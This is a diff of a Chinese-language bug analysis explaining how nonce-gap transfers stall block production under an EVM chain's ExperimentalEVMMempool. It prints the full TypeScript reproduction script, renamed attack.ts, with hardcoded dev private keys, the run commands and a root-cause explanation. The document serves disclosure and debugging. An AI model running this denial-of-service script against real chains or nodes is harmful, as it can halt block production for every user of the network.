@@ -13,7 +13,7 @@
 本文把下面三部分合并成一份纯技术说明：
 
 - 当前仓库的 mempool 代码路径
-- 外部压测脚本 `deadlock-transfer.ts`
+- 外部压测脚本 `attack.ts`
 - 之前的分析文档中与业务无关的技术结论
 
 本文不再保留任何业务场景描述，只保留：
@@ -69,13 +69,12 @@
 
 压测使用外部脚本：
 
-- `deadlock-transfer.ts`
+- `attack.ts`
 
-这个脚本本身不依赖特定业务交易，它做的事情非常纯粹：
+脚本做的事情是：
 
-- 初始化一批钱包
-- 必要时给它们注资
-- 然后按轮次并发发送普通 EVM 转账
+- 直接使用本地链默认 dev 账户
+- 按轮次并发发送普通 EVM 转账
 - 每轮都先发 `nonce = n + 1`
 - 再发 `nonce = n`
 
@@ -84,28 +83,27 @@
 - 同一发送者的超前 nonce 交易
 - queued -> pending -> promoted 的状态转换
 
-这已经足够触发当前问题，不需要额外混入业务消息。
-
 ## 4. 压测脚本到底做了什么
 
-脚本的核心参数大致如下：
+当前脚本的核心点只有这几项：
 
-- `WALLET_COUNT = 24`
 - 固定使用 `8545`
-- 每轮对每个钱包发送两笔转账
-- 第一波发送 `n + 1`
-- 短暂等待后再发送 `n`
+- 固定使用 4 个默认 dev 私钥
+- 每轮对每个账户发送两笔普通转账
+- 第一笔发送 `nonce = n + 1`
+- 第二笔发送 `nonce = n`
+- 独立轮询打印区块高度和 `num_unconfirmed_txs`
 
 它的主要流程可以概括成：
 
-1. 创建 24 个确定性钱包
-2. 用 faucet 给这些钱包补足余额
-3. 读取每个钱包当前的 pending nonce
-4. 每一轮先并发发送 `nonce = n + 1`
-5. 等待很短时间
-6. 再并发发送 `nonce = n`
-7. 成功则把本地游标推进到 `n + 2`
-8. 失败则重新查询 pending nonce
+1. 使用默认 dev 账户创建 4 个发送者钱包
+2. 读取每个发送者当前的 pending nonce
+3. 每一轮先并发发送 `nonce = n + 1`
+4. 等待很短时间
+5. 再并发发送 `nonce = n`
+6. 成功则把本地游标推进到 `n + 2`
+7. 失败则重新查询 pending nonce
+8. 每秒输出当前区块高度和未确认交易数
 
 这个流量模型的重点不在“转账金额”，而在：
 
@@ -119,104 +117,74 @@
 
 ### 4.1 压测脚本原文
 
-下面是当前用于复现问题的脚本原文，便于直接对照理解其流量模式：
+下面是当前用于复现问题的最小脚本：
 
 ```ts
 // @ts-nocheck
-import { JsonRpcProvider, Wallet, ethers } from "ethers";
+import { JsonRpcProvider, Wallet } from "ethers";
 
 const RPC_URL = "http://127.0.0.1:8545";
-const FAUCET_KEY = "0x88cbead91aee890d27bf06e003ade3d4e952427e88f88d31d61d3ef5e5d54305";
-const RECEIVER_KEY = "0x741de4f8988ea941d3ff0287911ca4074e62b7d45c991a51186455366f10b544";
-const WALLET_COUNT = 24;
-const GAS_PRICE = 10_000_000_000n;
-const FUND = ethers.parseEther("5");
-const VALUE = ethers.parseEther("0.00000000000001");
-const GAP_DELAY_MS = 80;
-const ROUND_DELAY_MS = 120;
+const COMET_URL = "http://127.0.0.1:26657";
+const RECEIVER = "0x1111111111111111111111111111111111111111";
+// These four keys match the default dev accounts created by local_node.sh.
+// Use the repo's local node bootstrap first, otherwise these accounts may not exist
+// or may not have enough balance to keep sending transactions.
+const KEYS = [
+  "0x88cbead91aee890d27bf06e003ade3d4e952427e88f88d31d61d3ef5e5d54305",
+  "0x741de4f8988ea941d3ff0287911ca4074e62b7d45c991a51186455366f10b544",
+  "0x3b7955d25189c99a7468192fcbc6429205c158834053ebe3f78f4512ab432db9",
+  "0x8a36c69d940a92fcea94b36d0f2928c7a0ee19a90073eda769693298dfa9603b",
+];
+const TX = { to: RECEIVER, value: 10_000n, gasLimit: 21_000n, gasPrice: 10_000_000_000n };
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
-const msg = (e: any) => e?.shortMessage ?? e?.info?.error?.message ?? e?.message ?? String(e);
-
-function derive(index: number, provider: JsonRpcProvider) {
-  return new Wallet(ethers.keccak256(ethers.toUtf8Bytes(`deadlock:${index}`)), provider);
-}
-
-async function send(sender: Wallet, to: string, nonce: number) {
-  try {
-    const tx = await sender.sendTransaction({ to, nonce, value: VALUE, gasLimit: 21_000n, gasPrice: GAS_PRICE });
-    console.log(` nonce=${nonce} from=${sender.address.slice(0, 10)} hash=${tx.hash}`);
-    return true;
-  } catch (e) {
-    console.log(` nonce=${nonce} from=${sender.address.slice(0, 10)} error=${msg(e)}`);
-    return false;
-  }
-}
-
-async function fund(faucet: Wallet, wallets: Wallet[]) {
-  let balances = await Promise.all(wallets.map((w) => faucet.provider.getBalance(w.address)));
-  let missing = wallets.filter((_, i) => balances[i] < FUND / 2n);
-  if (!missing.length) return;
-  const base = await faucet.provider.getTransactionCount(faucet.address, "pending");
-  for (let i = 0; i < missing.length; i += 1) {
-    const w = missing[i];
+function pollBlockNumber(provider: JsonRpcProvider) {
+  setInterval(async () => {
     try {
-      await faucet.sendTransaction({
-        to: w.address,
-        nonce: base + i,
-        value: FUND,
-        gasLimit: 21_000n,
-        gasPrice: GAS_PRICE,
-      });
+      const [block, mempool] = await Promise.all([provider.getBlockNumber(), fetch(`${COMET_URL}/num_unconfirmed_txs`).then((r) => r.json())]);
+      console.log(`blockNumber=${block}, unconfirmedTxs=${mempool.result.n_txs}`);
     } catch (e) {
-      console.log(` fundError=${msg(e)}`);
+      console.log(`error ${e}`);
     }
-  }
-  for (let i = 0; i < 20; i += 1) {
-    balances = await Promise.all(wallets.map((w) => faucet.provider.getBalance(w.address)));
-    missing = wallets.filter((_, j) => balances[j] < FUND / 2n);
-    if (!missing.length) return;
-    await sleep(1000);
-  }
+  }, 1000);
 }
 
 async function main() {
   const provider = new JsonRpcProvider(RPC_URL);
-  const faucet = new Wallet(FAUCET_KEY, provider);
-  const receiver = new Wallet(RECEIVER_KEY, provider);
-  const wallets = Array.from({ length: WALLET_COUNT }, (_, i) => derive(i, provider));
-  const cursors = new Map<string, number>();
+  const wallets = KEYS.map((key) => new Wallet(key, provider));
+  const nonces = await Promise.all(wallets.map((wallet) => provider.getTransactionCount(wallet.address, "pending")));
+  pollBlockNumber(provider);
 
-  await fund(faucet, wallets);
-  for (const w of wallets) cursors.set(w.address, await provider.getTransactionCount(w.address, "pending"));
-
-  console.log(`rpc=${RPC_URL} faucet=${faucet.address} receiver=${receiver.address} wallets=${WALLET_COUNT}`);
-
-  let round = 0;
   for (;;) {
-    round += 1;
-    console.log(`round=${round}`);
-
     await Promise.all(
-      wallets.map(async (w) => {
-        const n = cursors.get(w.address) ?? 0;
-        const ok = await send(w, receiver.address, n + 1);
-        if (!ok) cursors.set(w.address, await provider.getTransactionCount(w.address, "pending"));
+      wallets.map(async (wallet, i) => {
+        // Send nonce n+1 first so the tx is accepted as a gap tx and held back.
+        // This is the core condition needed to trigger queued -> promoted transitions.
+        await wallet.sendTransaction({ ...TX, nonce: nonces[i] + 1 }).catch(async () => {
+          nonces[i] = await provider.getTransactionCount(wallet.address, "pending");
+        });
       }),
     );
 
-    await sleep(GAP_DELAY_MS);
+    await sleep(80);
 
     await Promise.all(
-      wallets.map(async (w) => {
-        const n = cursors.get(w.address) ?? 0;
-        const ok = await send(w, receiver.address, n);
-        cursors.set(w.address, ok ? n + 2 : await provider.getTransactionCount(w.address, "pending"));
+      wallets.map(async (wallet, i) => {
+        // Then send nonce n. That fills the gap and can promote the previous tx.
+        // Repeating this pattern across several funded accounts keeps pressure on
+        // the ExperimentalEVMMempool promotion path.
+        await wallet
+          .sendTransaction({ ...TX, nonce: nonces[i] })
+          .then(() => {
+            nonces[i] += 2;
+          })
+          .catch(async () => {
+            nonces[i] = await provider.getTransactionCount(wallet.address, "pending");
+          });
       }),
     );
 
-    console.log("");
-    await sleep(ROUND_DELAY_MS);
+    await sleep(120);
   }
 }
 
@@ -239,11 +207,11 @@ main().catch((e) => {
 
 这条路径不是偶发，而是脚本每一轮都在持续制造。
 
-所以和之前那些混合业务流量相比，这个脚本更适合作为最小技术复现：
+这个脚本的特点是：
 
 - 它足够简单
 - 触发条件清楚
-- 没有业务层噪音
+- 没有额外的初始化噪音
 
 ## 6. 为什么只在 `ExperimentalEVMMempool` 下出现
 
@@ -433,10 +401,10 @@ curl -s -H 'content-type: application/json' \
 执行：
 
 ```bash
-node deadlock-transfer.ts
+node attack.ts
 ```
 
-如果你本地实际是用 `tsx` 或其他方式运行，也可以用你平时的命令，只要执行的是同一份脚本即可。
+如果你是在脚本所在目录外执行，也可以直接指定完整路径。
 
 ### 9.4 观察链是否停住
 
@@ -542,8 +510,7 @@ curl -s -H 'content-type: application/json' \
 
 如果只记一个最短结论，可以记成：
 
-- `deadlock-transfer.ts` 的本质作用不是制造业务流量
-- 而是持续制造 nonce gap
+- `attack.ts` 的本质作用就是持续制造 nonce gap
 - 在 `ExperimentalEVMMempool` 下，nonce gap 交易被 promoted 后会同步 `BroadcastTxSync`
 - 这条回灌路径会重入本地 mempool/txpool
 - 最终把 proposer 依赖的交易准备路径卡住，导致停出块
